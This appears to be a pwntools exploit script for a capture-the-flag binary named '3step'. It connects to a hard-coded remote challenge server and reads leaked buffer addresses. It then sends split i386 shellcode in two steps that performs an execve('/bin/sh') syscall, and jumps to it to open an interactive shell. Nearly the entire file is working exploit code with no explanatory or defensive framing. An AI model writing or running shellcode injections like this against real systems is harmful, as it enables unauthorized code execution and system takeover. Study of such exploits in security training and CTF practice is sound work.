#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template 3step
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('3step')
context.terminal = ['gnome-terminal', '-e']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("131.114.59.19", 8193, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

io = start()

print(disasm(b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\xb9\xbc\x72\xd4\xff\xff\xe1\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"))

io.recvuntil("Try out complimentary snacks\n")

buf1_addr = io.recvline(False)
log.info(buf1_addr)
buffino_addr = io.recvline(False)
log.info(buffino_addr)

payload1 = '''
xor    eax,eax          ;
cdq                     ;
push   eax              ;
push   0x68732f2f       ;
mov    ecx,''' + buffino_addr.decode("ascii") + ''';
jmp ecx;'''

print(payload1)
payload1 = asm(payload1)
print(disasm(payload1))

payload2 = '''
push   0x6e69622f       ;
mov    ebx,esp          ;
push   eax              ;
push   ebx              ;
mov    ecx,esp          ;
mov    al,0xb           ;
int    0x80             ;
'''

print(payload2)
payload2 = asm(payload2)
print(disasm(payload2))

io.recvuntil("Step 1: ")
io.sendline(payload1)
io.recvuntil("Step 2: ")
io.sendline(payload2)
io.recvuntil("Step 3: ")
io.sendline(p32(int(buf1_addr, 16)))

io.interactive()

